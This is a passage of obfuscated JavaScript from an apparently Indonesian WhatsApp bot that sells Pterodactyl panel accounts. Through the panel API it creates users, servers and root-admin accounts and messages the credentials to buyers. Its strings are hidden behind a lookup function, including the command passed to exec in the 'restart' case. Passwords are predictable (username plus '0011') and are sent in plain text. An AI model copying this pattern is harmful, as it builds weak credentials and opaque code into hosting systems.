                'locations': [parseInt(_0x5a7a92)],
                'dedicated_ip': false,
                'port_range': []
              }
            })
          });
          let _0x2218dc = await _0x15e590[_0x597c(487)]();
          if (_0x2218dc[_0x597c(915)]) {
            return _0x432e1b[_0x597c(395)](JSON.stringify(_0x2218dc[_0x597c(915)][0], null, 2));
          }
        }
        break;
      case _0x597c(982):
        {
          if (!_0x403967 && !_0x18271c) {
            return _0x3652ad(mess[_0x597c(842)][_0x597c(456)]);
          }
          let _0xc54af4 = _0x4d0552[_0x597c(613)](',');
          if (_0xc54af4[_0x597c(625)] < 2) {
            return _0x432e1b[_0x597c(395)](_0x597c(988) + (_0x49f20b + _0x4af652) + _0x597c(929));
          }
          let _0x1cbc47 = _0xc54af4[0];
          let _0x22b6db = _0x432e1b[_0x597c(488)] ? _0x432e1b.quoted[_0x597c(467)] : _0xc54af4[1] ? _0xc54af4[1][_0x597c(729)](/[^0-9]/g, '') + _0x597c(981) : _0x432e1b[_0x597c(836)][0];
          let _0x470b42 = _0x1cbc47 + '15GB';
          let _0x51884c = global[_0x597c(886)];
          let _0x3c3344 = global.location;
          let _0x1b6b78 = _0x597c(647);
          let _0x3dc076 = _0x597c(647);
          let _0x4f586a = _0x1cbc47 + _0x597c(589);
          akunlo = "https://telegra.ph/file/3d91b41617cb982acf0c4.jpg";
          if (!_0x22b6db) {
            return;
          }
          let _0x33a4b4 = _0x1cbc47 + _0x597c(377);
          let _0x3415d0 = await fetch(domain + _0x597c(722), {
            'method': _0x597c(970),
            'headers': {
              'Accept': _0x597c(599),
              'Content-Type': "application/json",
              'Authorization': _0x597c(792) + apikey
            },
            'body': JSON[_0x597c(554)]({
              'email': _0x4f586a,
              'username': _0x1cbc47,
              'first_name': _0x1cbc47,
              'last_name': _0x1cbc47,
              'language': 'en',
              'password': _0x33a4b4
            })
          });
          let _0x307fca = await _0x3415d0[_0x597c(487)]();
          if (_0x307fca.errors) {
            return _0x432e1b[_0x597c(395)](JSON[_0x597c(554)](_0x307fca[_0x597c(915)][0], null, 2));
          }
          let _0x479504 = _0x307fca[_0x597c(740)];
          let _0x4d7f3d = await fetch(domain + "/api/application/nests/5/eggs/" + _0x51884c, {
            'method': _0x597c(674),
            'headers': {
              'Accept': _0x597c(599),
              'Content-Type': _0x597c(599),
              'Authorization': _0x597c(792) + apikey
            }
          });
          const _0x473b95 = {
            url: akunlo
          };
          _0x432e1b[_0x597c(395)](_0x597c(346) + _0x479504.id);
          ctf = _0x597c(854) + _0x22b6db.split`@`[0] + _0x597c(1006) + _0x479504[_0x597c(632)] + "\n⎙─➤ *🔐PASSWORD* : " + _0x33a4b4 + _0x597c(782) + domain + _0x597c(985);
          _0x5051a5[_0x597c(937)](_0x22b6db, {
            'image': _0x473b95,
            'caption': ctf
          }, {
            'quoted': _0x5051a5[_0x597c(805)]
          });
          const _0x4d0a98 = {
            memory: _0x1b6b78,
            swap: 0x0,
            disk: _0x3dc076,
            io: 0x1f4,
            cpu: "420"
          };
          const _0x2e88e3 = {
            databases: 0x5,
            backups: 0x5,
            allocations: 0x1
          };
          let _0x437382 = await _0x4d7f3d[_0x597c(487)]();
          let _0xe26d98 = _0x437382[_0x597c(740)][_0x597c(807)];
          let _0xe9e2 = await fetch(domain + _0x597c(474), {
            'method': _0x597c(970),
            'headers': {
              'Accept': _0x597c(599),
              'Content-Type': "application/json",
              'Authorization': _0x597c(792) + apikey
            },
            'body': JSON[_0x597c(554)]({
              'name': _0x470b42,
              'description': _0x597c(784),
              'user': _0x479504.id,
              'egg': parseInt(_0x51884c),
              'docker_image': _0x597c(911),
              'startup': _0xe26d98,
              'environment': {
                'INST': "npm",
                'USER_UPLOAD': '0',
                'AUTO_UPDATE': '0',
                'CMD_RUN': _0x597c(396)
              },
              'limits': _0x4d0a98,
              'feature_limits': _0x2e88e3,
              'deploy': {
                'locations': [parseInt(_0x3c3344)],
                'dedicated_ip': false,
                'port_range': []
              }
            })
          });
          let _0x5cf1a3 = await _0xe9e2.json();
          if (_0x5cf1a3[_0x597c(915)]) {
            return _0x432e1b.rzxReply(JSON[_0x597c(554)](_0x5cf1a3[_0x597c(915)][0], null, 2));
          }
        }
        break;
      case _0x597c(758):
        {
          if (!_0x403967 && !_0x18271c) {
            return _0x3652ad(mess[_0x597c(842)][_0x597c(456)]);
          }
          let _0x38cee8 = _0x4d0552[_0x597c(613)](',');
          if (_0x38cee8[_0x597c(625)] < 2) {
            return _0x432e1b[_0x597c(395)]("*Format salah!*\nPenggunaan:\n" + (_0x49f20b + _0x4af652) + _0x597c(929));
          }
          let _0x3838ae = _0x38cee8[0];
          let _0x2b7d3b = _0x432e1b.quoted ? _0x432e1b[_0x597c(488)][_0x597c(467)] : _0x38cee8[1] ? _0x38cee8[1].replace(/[^0-9]/g, '') + _0x597c(981) : _0x432e1b[_0x597c(836)][0];
          let _0x58c4ca = _0x3838ae + '16GB';
          let _0xc1ce21 = global[_0x597c(886)];
          let _0x53b159 = global[_0x597c(544)];
          let _0x306bb8 = _0x597c(960);
          let _0x32d91e = _0x597c(1008);
          let _0x4dcc35 = _0x3838ae + _0x597c(589);
          akunlo = _0x597c(916);
          if (!_0x2b7d3b) {
            return;
          }
          let _0x5d0193 = _0x3838ae + _0x597c(377);
          let _0x1e6cc2 = await fetch(domain + _0x597c(722), {
            'method': _0x597c(970),
            'headers': {
              'Accept': _0x597c(599),
              'Content-Type': "application/json",
              'Authorization': _0x597c(792) + apikey
            },
            'body': JSON.stringify({
              'email': _0x4dcc35,
              'username': _0x3838ae,
              'first_name': _0x3838ae,
              'last_name': _0x3838ae,
              'language': 'en',
              'password': _0x5d0193
            })
          });
          let _0x989cd = await _0x1e6cc2.json();
          if (_0x989cd.errors) {
            return _0x432e1b[_0x597c(395)](JSON[_0x597c(554)](_0x989cd[_0x597c(915)][0], null, 2));
          }
          let _0x11a74b = _0x989cd[_0x597c(740)];
          let _0x1787c0 = await fetch(domain + _0x597c(767) + _0xc1ce21, {
            'method': _0x597c(674),
            'headers': {
              'Accept': _0x597c(599),
              'Content-Type': "application/json",
              'Authorization': _0x597c(792) + apikey
            }
          });
          const _0x27423c = {
            url: akunlo
          };
          _0x432e1b[_0x597c(395)](_0x597c(346) + _0x11a74b.id);
          ctf = _0x597c(854) + _0x2b7d3b[_0x597c(613)]`@`[0] + _0x597c(1006) + _0x11a74b.username + "\n⎙─➤ *🔐PASSWORD* : " + _0x5d0193 + _0x597c(782) + domain + "\n\nNOTE:\n𝟭.𝗢𝗪𝗡𝗘𝗥 𝗛𝗔𝗡𝗬𝗔 𝗠𝗘𝗡𝗚𝗜𝗥𝗜𝗠 𝗗𝗔𝗧𝗔 𝗔𝗞𝗨𝗡 𝟭𝗫 \n𝟮.𝗝𝗔𝗡𝗚𝗔𝗡 𝗦𝗛𝗔𝗥𝗘 𝗔𝗞𝗨𝗡 𝗣𝗔𝗡𝗘𝗟 𝗔𝗡𝗗𝗔\n𝟯.𝗡𝗢 𝗦𝗛𝗔𝗥𝗘 𝗪𝗘𝗕𝗦𝗜𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 \n𝟰.𝗡𝗢 𝗠𝗔𝗞𝗦𝗔 𝗥𝗘𝗙𝗙 \n𝟱.𝗝𝗔𝗡𝗚𝗔𝗡 𝗟𝗨𝗣𝗔 𝗕𝗜𝗟𝗔𝗡𝗚 𝗗𝗢𝗡𝗘 𝗧𝗘𝗥𝗜𝗠𝗔𝗞𝗔𝗦𝗜𝗛\n𝟲. 𝗢𝗪𝗡 𝗣𝗔𝗡𝗘𝗟 : wa.me/62895364760801\n=====================================\n";
          _0x5051a5[_0x597c(937)](_0x2b7d3b, {
            'image': _0x27423c,
            'caption': ctf
          }, {
            'quoted': _0x5051a5.chat
          });
          const _0x351d16 = {
            memory: '16240',
            swap: 0x0,
            disk: _0x32d91e,
            io: 0x1f4,
            cpu: _0x306bb8
          };
          const _0x1217cc = {
            databases: 0x5,
            backups: 0x5,
            allocations: 0x1
          };
          let _0x402b73 = await _0x1787c0[_0x597c(487)]();
          let _0x103e74 = _0x402b73[_0x597c(740)][_0x597c(807)];
          let _0x1d7395 = await fetch(domain + "/api/application/servers", {
            'method': "POST",
            'headers': {
              'Accept': _0x597c(599),
              'Content-Type': _0x597c(599),
              'Authorization': _0x597c(792) + apikey
            },
            'body': JSON[_0x597c(554)]({
              'name': _0x58c4ca,
              'description': _0x597c(784),
              'user': _0x11a74b.id,
              'egg': parseInt(_0xc1ce21),
              'docker_image': _0x597c(911),
              'startup': _0x103e74,
              'environment': {
                'INST': _0x597c(521),
                'USER_UPLOAD': '0',
                'AUTO_UPDATE': '0',
                'CMD_RUN': _0x597c(396)
              },
              'limits': _0x351d16,
              'feature_limits': _0x1217cc,
              'deploy': {
                'locations': [parseInt(_0x53b159)],
                'dedicated_ip': false,
                'port_range': []
              }
            })
          });
          let _0x5964a6 = await _0x1d7395.json();
          if (_0x5964a6[_0x597c(915)]) {
            return _0x432e1b[_0x597c(395)](JSON[_0x597c(554)](_0x5964a6[_0x597c(915)][0], null, 2));
          }
        }
        break;
      case _0x597c(668):
        {
          if (!_0x403967 && !_0x18271c) {
            return _0x3652ad(mess[_0x597c(842)][_0x597c(456)]);
          }
          let _0x38caab = _0x4d0552[_0x597c(613)](',');
          if (_0x38caab[_0x597c(625)] < 2) {
            return _0x432e1b.rzxReply("*Format salah!*\nPenggunaan:\n" + (_0x49f20b + _0x4af652) + _0x597c(929));
          }
          let _0x15b6c6 = _0x38caab[0];
          let _0x532ec7 = _0x432e1b.quoted ? _0x432e1b[_0x597c(488)][_0x597c(467)] : _0x38caab[1] ? _0x38caab[1][_0x597c(729)](/[^0-9]/g, '') + _0x597c(981) : _0x432e1b[_0x597c(836)][0];
          let _0x54b9d1 = _0x15b6c6 + _0x597c(941);
          let _0x3e5202 = global[_0x597c(886)];
          let _0x1fc127 = global[_0x597c(544)];
          let _0x34d79b = _0x597c(603);
          let _0x2aadde = _0x597c(754);
          let _0x28a18c = _0x597c(603);
          let _0x1fdd54 = _0x15b6c6 + _0x597c(589);
          akunlo = "https://telegra.ph/file/3d91b41617cb982acf0c4.jpg";
          if (!_0x532ec7) {
            return;
          }
          let _0x3479c6 = _0x15b6c6 + _0x597c(377);
          let _0x549f40 = await fetch(domain + _0x597c(722), {
            'method': _0x597c(970),
            'headers': {
              'Accept': _0x597c(599),
              'Content-Type': _0x597c(599),
              'Authorization': _0x597c(792) + apikey
            },
            'body': JSON[_0x597c(554)]({
              'email': _0x1fdd54,
              'username': _0x15b6c6,
              'first_name': _0x15b6c6,
              'last_name': _0x15b6c6,
              'language': 'en',
              'password': _0x3479c6
            })
          });
          let _0x4bb25f = await _0x549f40[_0x597c(487)]();
          if (_0x4bb25f[_0x597c(915)]) {
            return _0x432e1b[_0x597c(395)](JSON.stringify(_0x4bb25f[_0x597c(915)][0], null, 2));
          }
          let _0x34b20c = _0x4bb25f[_0x597c(740)];
          let _0x2fece5 = await fetch(domain + _0x597c(767) + _0x3e5202, {
            'method': _0x597c(674),
            'headers': {
              'Accept': _0x597c(599),
              'Content-Type': _0x597c(599),
              'Authorization': _0x597c(792) + apikey
            }
          });
          const _0x15c4ad = {
            url: akunlo
          };
          _0x432e1b[_0x597c(395)]("SUCCES CREATE USER ID: " + _0x34b20c.id);
          ctf = _0x597c(854) + _0x532ec7[_0x597c(613)]`@`[0] + "\n\n⎙─➤ *👤USERNAME* : " + _0x34b20c[_0x597c(632)] + _0x597c(652) + _0x3479c6 + _0x597c(782) + domain + _0x597c(985);
          _0x5051a5[_0x597c(937)](_0x532ec7, {
            'image': _0x15c4ad,
            'caption': ctf
          }, {
            'quoted': _0x5051a5[_0x597c(805)]
          });
          const _0x195cb3 = {
            memory: _0x34d79b,
            swap: 0x0,
            disk: _0x28a18c,
            io: 0x1f4,
            cpu: _0x2aadde
          };
          const _0x34c5d7 = {
            databases: 0x5,
            backups: 0x5,
            allocations: 0x1
          };
          let _0x5c1c8e = await _0x2fece5[_0x597c(487)]();
          let _0x2f15d3 = _0x5c1c8e[_0x597c(740)].startup;
          let _0x3b5ddf = await fetch(domain + _0x597c(474), {
            'method': "POST",
            'headers': {
              'Accept': _0x597c(599),
              'Content-Type': _0x597c(599),
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
              'name': _0x54b9d1,
              'description': _0x597c(784),
              'user': _0x34b20c.id,
              'egg': parseInt(_0x3e5202),
              'docker_image': "ghcr.io/parkervcp/yolks:nodejs_18",
              'startup': _0x2f15d3,
              'environment': {
                'INST': _0x597c(521),
                'USER_UPLOAD': '0',
                'AUTO_UPDATE': '0',
                'CMD_RUN': _0x597c(396)
              },
              'limits': _0x195cb3,
              'feature_limits': _0x34c5d7,
              'deploy': {
                'locations': [parseInt(_0x1fc127)],
                'dedicated_ip': false,
                'port_range': []
              }
            })
          });
          let _0x28574f = await _0x3b5ddf[_0x597c(487)]();
          if (_0x28574f.errors) {
            return _0x432e1b.rzxReply(JSON[_0x597c(554)](_0x28574f[_0x597c(915)][0], null, 2));
          }
        }
        break;
      case _0x597c(774):
        {
          if (!_0x403967 && !_0x18271c) {
            return _0x3652ad(mess[_0x597c(842)][_0x597c(456)]);
          }
          let _0x24dfe8 = _0x4d0552[_0x597c(613)](',');
          if (_0x24dfe8[_0x597c(625)] < 2) {
            return _0x432e1b.rzxReply("*Format salah!*\nPenggunaan:\n" + (_0x49f20b + _0x4af652) + _0x597c(929));
          }
          let _0x4edd81 = _0x24dfe8[0];
          let _0x14e8d2 = _0x432e1b.quoted ? _0x432e1b.quoted[_0x597c(467)] : _0x24dfe8[1] ? _0x24dfe8[1][_0x597c(729)](/[^0-9]/g, '') + "@s.whatsapp.net" : _0x432e1b[_0x597c(836)][0];
          let _0x50e595 = _0x4edd81 + _0x597c(766);
          let _0x1609ae = global[_0x597c(886)];
          let _0x7ae32a = global.location;
          let _0x209ba0 = _0x597c(640);
          let _0x4f759c = _0x597c(640);
          let _0x5881eb = _0x4edd81 + _0x597c(589);
          akunlo = _0x597c(916);
          if (!_0x14e8d2) {
            return;
          }
          let _0x4991a9 = _0x4edd81 + "0011";
          let _0x3c74ed = await fetch(domain + _0x597c(722), {
            'method': _0x597c(970),
            'headers': {
              'Accept': _0x597c(599),
              'Content-Type': _0x597c(599),
              'Authorization': _0x597c(792) + apikey
            },
            'body': JSON[_0x597c(554)]({
              'email': _0x5881eb,
              'username': _0x4edd81,
              'first_name': _0x4edd81,
              'last_name': _0x4edd81,
              'language': 'en',
              'password': _0x4991a9
            })
          });
          let _0x2ff721 = await _0x3c74ed[_0x597c(487)]();
          if (_0x2ff721[_0x597c(915)]) {
            return _0x432e1b[_0x597c(395)](JSON[_0x597c(554)](_0x2ff721[_0x597c(915)][0], null, 2));
          }
          let _0x2768b1 = _0x2ff721[_0x597c(740)];
          let _0x2614e5 = await fetch(domain + _0x597c(767) + _0x1609ae, {
            'method': "GET",
            'headers': {
              'Accept': _0x597c(599),
              'Content-Type': _0x597c(599),
              'Authorization': _0x597c(792) + apikey
            }
          });
          const _0x2f7bc1 = {
            url: akunlo
          };
          _0x432e1b[_0x597c(395)]("SUCCES CREATE USER ID: " + _0x2768b1.id);
          ctf = _0x597c(854) + _0x14e8d2[_0x597c(613)]`@`[0] + _0x597c(1006) + _0x2768b1[_0x597c(632)] + _0x597c(652) + _0x4991a9 + _0x597c(782) + domain + _0x597c(985);
          _0x5051a5[_0x597c(937)](_0x14e8d2, {
            'image': _0x2f7bc1,
            'caption': ctf
          }, {
            'quoted': _0x5051a5[_0x597c(805)]
          });
          const _0x4ac7bd = {
            memory: _0x209ba0,
            swap: 0x0,
            disk: _0x4f759c,
            io: 0x1f4,
            cpu: "230"
          };
          const _0x2df8c2 = {
            databases: 0x5,
            backups: 0x5,
            allocations: 0x1
          };
          let _0x5374cf = await _0x2614e5[_0x597c(487)]();
          let _0x2d0c15 = _0x5374cf[_0x597c(740)][_0x597c(807)];
          let _0x5673ca = await fetch(domain + _0x597c(474), {
            'method': _0x597c(970),
            'headers': {
              'Accept': _0x597c(599),
              'Content-Type': "application/json",
              'Authorization': _0x597c(792) + apikey
            },
            'body': JSON[_0x597c(554)]({
              'name': _0x50e595,
              'description': _0x597c(784),
              'user': _0x2768b1.id,
              'egg': parseInt(_0x1609ae),
              'docker_image': _0x597c(911),
              'startup': _0x2d0c15,
              'environment': {
                'INST': "npm",
                'USER_UPLOAD': '0',
                'AUTO_UPDATE': '0',
                'CMD_RUN': "npm start"
              },
              'limits': _0x4ac7bd,
              'feature_limits': _0x2df8c2,
              'deploy': {
                'locations': [parseInt(_0x7ae32a)],
                'dedicated_ip': false,
                'port_range': []
              }
            })
          });
          let _0x1d7325 = await _0x5673ca.json();
          if (_0x1d7325[_0x597c(915)]) {
            return _0x432e1b[_0x597c(395)](JSON.stringify(_0x1d7325.errors[0], null, 2));
          }
        }
        break;
      case _0x597c(992):
        {
          if (!_0x403967 && !_0x18271c) {
            return _0x3652ad(mess.only[_0x597c(456)]);
          }
          let _0x4775cc = _0x4d0552.split(',');
          if (_0x4775cc[_0x597c(625)] < 2) {
            return _0x432e1b[_0x597c(395)]("*Format salah!*\nPenggunaan:\n" + (_0x49f20b + _0x4af652) + _0x597c(929));
          }
          let _0x535f4d = _0x4775cc[0];
          let _0x28f707 = _0x432e1b[_0x597c(488)] ? _0x432e1b.quoted.sender : _0x4775cc[1] ? _0x4775cc[1][_0x597c(729)](/[^0-9]/g, '') + _0x597c(981) : _0x432e1b[_0x597c(836)][0];
          let _0x511d51 = _0x535f4d + _0x597c(356);
          let _0x5a2143 = global[_0x597c(886)];
          let _0xa0210e = global.location;
          let _0x261533 = _0x597c(560);
          let _0x30dc5e = _0x597c(918);
          let _0x837f4c = _0x535f4d + _0x597c(589);
          akunlo = _0x597c(916);
          if (!_0x28f707) {
            return;
          }
          let _0x11b9dd = _0x535f4d + "0011";
          let _0x562b14 = await fetch(domain + _0x597c(722), {
            'method': _0x597c(970),
            'headers': {
              'Accept': _0x597c(599),
              'Content-Type': _0x597c(599),
              'Authorization': _0x597c(792) + apikey
            },
            'body': JSON[_0x597c(554)]({
              'email': _0x837f4c,
              'username': _0x535f4d,
              'first_name': _0x535f4d,
              'last_name': _0x535f4d,
              'language': 'en',
              'password': _0x11b9dd
            })
          });
          let _0x31e5a0 = await _0x562b14.json();
          if (_0x31e5a0.errors) {
            return _0x432e1b[_0x597c(395)](JSON[_0x597c(554)](_0x31e5a0.errors[0], null, 2));
          }
          let _0x539d48 = _0x31e5a0[_0x597c(740)];
          let _0x396152 = await fetch(domain + _0x597c(767) + _0x5a2143, {
            'method': _0x597c(674),
            'headers': {
              'Accept': _0x597c(599),
              'Content-Type': "application/json",
              'Authorization': _0x597c(792) + apikey
            }
          });
          const _0x42a13a = {
            url: akunlo
          };
          _0x432e1b[_0x597c(395)](_0x597c(346) + _0x539d48.id);
          ctf = _0x597c(854) + _0x28f707[_0x597c(613)]`@`[0] + _0x597c(1006) + _0x539d48[_0x597c(632)] + _0x597c(652) + _0x11b9dd + _0x597c(782) + domain + _0x597c(985);
          _0x5051a5[_0x597c(937)](_0x28f707, {
            'image': _0x42a13a,
            'caption': ctf
          }, {
            'quoted': _0x5051a5[_0x597c(805)]
          });
          const _0x5ec7a2 = {
            memory: "12240",
            swap: 0x0,
            disk: _0x30dc5e,
            io: 0x1f4,
            cpu: _0x261533
          };
          const _0x11a48b = {
            databases: 0x5,
            backups: 0x5,
            allocations: 0x1
          };
          let _0x4aaf52 = await _0x396152.json();
          let _0x48548c = _0x4aaf52[_0x597c(740)][_0x597c(807)];
          let _0xa14ce8 = await fetch(domain + _0x597c(474), {
            'method': _0x597c(970),
            'headers': {
              'Accept': _0x597c(599),
              'Content-Type': _0x597c(599),
              'Authorization': "Bearer " + apikey
            },
            'body': JSON[_0x597c(554)]({
              'name': _0x511d51,
              'description': "PANEL BY RIZXVELZ⚡,TERIMAKASIH SUDAH ORDER",
              'user': _0x539d48.id,
              'egg': parseInt(_0x5a2143),
              'docker_image': "ghcr.io/parkervcp/yolks:nodejs_18",
              'startup': _0x48548c,
              'environment': {
                'INST': "npm",
                'USER_UPLOAD': '0',
                'AUTO_UPDATE': '0',
                'CMD_RUN': _0x597c(396)
              },
              'limits': _0x5ec7a2,
              'feature_limits': _0x11a48b,
              'deploy': {
                'locations': [parseInt(_0xa0210e)],
                'dedicated_ip': false,
                'port_range': []
              }
            })
          });
          let _0x58f1bd = await _0xa14ce8[_0x597c(487)]();
          if (_0x58f1bd.errors) {
            return _0x432e1b[_0x597c(395)](JSON.stringify(_0x58f1bd.errors[0], null, 2));
          }
        }
        break;
      case "11gb":
        {
          if (!_0x403967 && !_0x18271c) {
            return _0x3652ad(mess[_0x597c(842)][_0x597c(456)]);
          }
          let _0x50cdb0 = _0x4d0552[_0x597c(613)](',');
          if (_0x50cdb0.length < 2) {
            return _0x432e1b[_0x597c(395)](_0x597c(988) + (_0x49f20b + _0x4af652) + _0x597c(929));
          }
          let _0xd46caa = _0x50cdb0[0];
          let _0x5f3f95 = _0x432e1b[_0x597c(488)] ? _0x432e1b[_0x597c(488)][_0x597c(467)] : _0x50cdb0[1] ? _0x50cdb0[1][_0x597c(729)](/[^0-9]/g, '') + _0x597c(981) : _0x432e1b[_0x597c(836)][0];
          let _0xbaf836 = _0xd46caa + _0x597c(432);
          let _0x3d6c5d = global[_0x597c(886)];
          let _0x273923 = global[_0x597c(544)];
          let _0x4d1531 = _0x597c(390);
          let _0x18736f = _0x597c(390);
          let _0x310825 = _0xd46caa + "1398@gmail.com";
          akunlo = _0x597c(916);
          if (!_0x5f3f95) {
            return;
          }
          let _0x1dcc66 = _0xd46caa + "0011";
          let _0xd07689 = await fetch(domain + "/api/application/users", {
            'method': _0x597c(970),
            'headers': {
              'Accept': _0x597c(599),
              'Content-Type': "application/json",
              'Authorization': _0x597c(792) + apikey
            },
            'body': JSON[_0x597c(554)]({
              'email': _0x310825,
              'username': _0xd46caa,
              'first_name': _0xd46caa,
              'last_name': _0xd46caa,
              'language': 'en',
              'password': _0x1dcc66
            })
          });
          let _0x3d0264 = await _0xd07689[_0x597c(487)]();
          if (_0x3d0264[_0x597c(915)]) {
            return _0x432e1b[_0x597c(395)](JSON.stringify(_0x3d0264.errors[0], null, 2));
          }
          let _0x472929 = _0x3d0264[_0x597c(740)];
          let _0x5227d4 = await fetch(domain + _0x597c(767) + _0x3d6c5d, {
            'method': _0x597c(674),
            'headers': {
              'Accept': "application/json",
              'Content-Type': _0x597c(599),
              'Authorization': "Bearer " + apikey
            }
          });
          const _0x13124b = {
            url: akunlo
          };
          _0x432e1b[_0x597c(395)](_0x597c(346) + _0x472929.id);
          ctf = _0x597c(854) + _0x5f3f95.split`@`[0] + _0x597c(1006) + _0x472929[_0x597c(632)] + "\n⎙─➤ *🔐PASSWORD* : " + _0x1dcc66 + _0x597c(782) + domain + _0x597c(985);
          _0x5051a5[_0x597c(937)](_0x5f3f95, {
            'image': _0x13124b,
            'caption': ctf
          }, {
            'quoted': _0x5051a5[_0x597c(805)]
          });
          const _0x2487ae = {
            memory: _0x4d1531,
            swap: 0x0,
            disk: _0x18736f,
            io: 0x1f4,
            cpu: "280"
          };
          const _0x1c1a17 = {
            databases: 0x5,
            backups: 0x5,
            allocations: 0x1
          };
          let _0x11ca3a = await _0x5227d4[_0x597c(487)]();
          let _0x681137 = _0x11ca3a[_0x597c(740)][_0x597c(807)];
          let _0x130211 = await fetch(domain + _0x597c(474), {
            'method': _0x597c(970),
            'headers': {
              'Accept': _0x597c(599),
              'Content-Type': _0x597c(599),
              'Authorization': _0x597c(792) + apikey
            },
            'body': JSON[_0x597c(554)]({
              'name': _0xbaf836,
              'description': _0x597c(784),
              'user': _0x472929.id,
              'egg': parseInt(_0x3d6c5d),
              'docker_image': _0x597c(911),
              'startup': _0x681137,
              'environment': {
                'INST': _0x597c(521),
                'USER_UPLOAD': '0',
                'AUTO_UPDATE': '0',
                'CMD_RUN': _0x597c(396)
              },
              'limits': _0x2487ae,
              'feature_limits': _0x1c1a17,
              'deploy': {
                'locations': [parseInt(_0x273923)],
                'dedicated_ip': false,
                'port_range': []
              }
            })
          });
          let _0x17c580 = await _0x130211[_0x597c(487)]();
          if (_0x17c580[_0x597c(915)]) {
            return _0x432e1b[_0x597c(395)](JSON.stringify(_0x17c580.errors[0], null, 2));
          }
        }
        break;
      case _0x597c(757):
        {
          if (!_0x18271c) {
            return _0x3652ad("*hedeh si ajg*");
          }
          if (!_0x18271c) {
            return _0x3652ad(mess[_0x597c(633)]);
          }
          let _0x16cad1 = q[_0x597c(613)](',');
          let _0x3a2ba4 = _0x16cad1[0];
          let _0x3288c0 = _0x16cad1[1];
          if (_0x16cad1[_0x597c(625)] < 2) {
            return _0x3652ad(_0x597c(988) + (_0x49f20b + _0x4af652) + _0x597c(929));
          }
          if (!_0x3a2ba4) {
            return _0x3652ad("Ex : " + (_0x49f20b + _0x4af652) + " Username,@tag/nomor\n\nContoh :\n" + (_0x49f20b + _0x4af652) + " example,@user");
          }
          if (!_0x3288c0) {
            return _0x3652ad(_0x597c(785) + (_0x49f20b + _0x4af652) + _0x597c(749) + (_0x49f20b + _0x4af652) + _0x597c(809));
          }
          let _0x2c5bc5 = _0x3a2ba4 + _0x597c(838);
          let _0x238d57 = _0x3288c0[_0x597c(729)](/[^0-9]/g, '') + _0x597c(981);
          let _0x213457 = await fetch(domain + _0x597c(722), {
            'method': _0x597c(970),
            'headers': {
              'Accept': _0x597c(599),
              'Content-Type': _0x597c(599),
              'Authorization': "Bearer " + apikey
            },
            'body': JSON[_0x597c(554)]({
              'email': _0x3a2ba4 + _0x597c(555),
              'username': _0x3a2ba4,
              'first_name': _0x3a2ba4,
              'last_name': _0x597c(349),
              'language': 'en',
              'root_admin': true,
              'password': _0x2c5bc5[_0x597c(556)]()
            })
          });
          let _0x42a62a = await _0x213457[_0x597c(487)]();
          if (_0x42a62a[_0x597c(915)]) {
            return _0x432e1b.rzxReply(JSON.stringify(_0x42a62a.errors[0], null, 2));
          }
          let _0x20a850 = _0x42a62a[_0x597c(740)];
          let _0x4a7691 = _0x597c(771) + _0x20a850.id + _0x597c(921) + _0x20a850[_0x597c(638)] + _0x597c(565) + _0x20a850[_0x597c(632)] + "\n📬EMAIL: " + _0x20a850[_0x597c(499)] + "\n🦖NAME: " + _0x20a850[_0x597c(1018)] + " " + _0x20a850.last_name + _0x597c(505) + _0x20a850[_0x597c(550)] + _0x597c(445) + _0x20a850[_0x597c(578)] + _0x597c(851) + _0x20a850[_0x597c(877)] + _0x597c(366) + domain + "\n";
          const _0x3d95a9 = {
            text: _0x4a7691
          };
          await _0x5051a5.sendMessage(_0x432e1b[_0x597c(805)], _0x3d95a9);
          await _0x5051a5.sendMessage(_0x238d57, {
            'text': _0x597c(735) + _0x3a2ba4 + "\n🔑PASSWORD: " + _0x2c5bc5 + "\n🌐LOGIN: " + domain + "\n\n==============================\n⚠️ Rules Admin panel : \n\n• Jangan Curi Sc\n• Jangan Buka Panel Orang\n• Jangan Ddos Server\n• Kalo jualan sensor domainnya\n• Jangan Bagi² Panel Free\n• Jangan Jualan AdminP Kecuali Pt Gw !!\n• Dilirang Keras Pasang Sc/Bot DDOS\n\nNGEYEL? KICK NO REFF NO DRAMA\nJangan Lupa Bilang Done Yaa Beb >•<\n==============================\nTHANKS FOR BUYING AT RIZXVELZ⚡😁✌️ \n\n\n*NOTE : OWNER HANYA MENGIRIM 1X DATA AKUN ANDA MOHON DI SIMPAN BAIK BAIK KALAU DATA AKUN ANDA HILANG OWNER TIDAK DAPAT MENGIRIM AKUN ANDA LAGI*\n\n\n"
          });
        }
        break;
      case _0x597c(427):
        {
          if (!_0x18271c) {
            return _0x3652ad(_0x597c(840));
          }
          let _0x42bdd0 = _0x46e001[0] ? _0x46e001[0] : '1';
          let _0x56e5ae = await fetch(domain + _0x597c(696) + _0x42bdd0, {
            'method': 'GET',
            'headers': {
              'Accept': "application/json",
              'Content-Type': _0x597c(599),
              'Authorization': _0x597c(792) + apikey
            }
          });
          let _0x78561e = await _0x56e5ae[_0x597c(487)]();
          let _0xb6c227 = _0x78561e[_0x597c(777)];
          let _0x33898f = _0x597c(486);
          for (let _0x59991f of _0xb6c227) {
            let _0x3ba46a = _0x59991f[_0x597c(740)];
            if (_0x3ba46a.root_admin) {
              _0x33898f += _0x597c(899) + _0x3ba46a.id + " - Status: " + (_0x3ba46a[_0x597c(740)]?.["user"]?.[_0x597c(1015)] === null ? _0x597c(950) : "Active") + "\n";
              _0x33898f += _0x3ba46a[_0x597c(632)] + "\n";
              _0x33898f += _0x3ba46a[_0x597c(1018)] + " " + _0x3ba46a[_0x597c(411)] + "\n\n";
            }
          }
          _0x33898f += "Page: " + _0x78561e[_0x597c(666)][_0x597c(484)].current_page + '/' + _0x78561e[_0x597c(666)][_0x597c(484)][_0x597c(422)] + "\n";
          _0x33898f += "Total Admin: " + _0x78561e[_0x597c(666)].pagination[_0x597c(1001)];
          await _0x5051a5.sendMessage(_0x432e1b[_0x597c(805)], {
            'text': _0x33898f
          }, {
            'quoted': _0x432e1b
          });
          if (_0x78561e[_0x597c(666)].pagination.current_page < _0x78561e[_0x597c(666)][_0x597c(484)][_0x597c(422)]) {
            _0x432e1b[_0x597c(395)](_0x597c(580) + _0x49f20b + _0x597c(700) + (_0x78561e[_0x597c(666)].pagination[_0x597c(586)] + 1) + _0x597c(908));
          }
        }
        break;
      case "restart":
        if (!_0x18271c && !msg[_0x597c(526)].fromMe) {
          return _0x3652ad(_0x597c(404));
        }
        exec(_0x597c(964), (_0x1d8c10, _0x3309f6, _0x1bae3a) => {
          _0x3652ad(_0x597c(630));
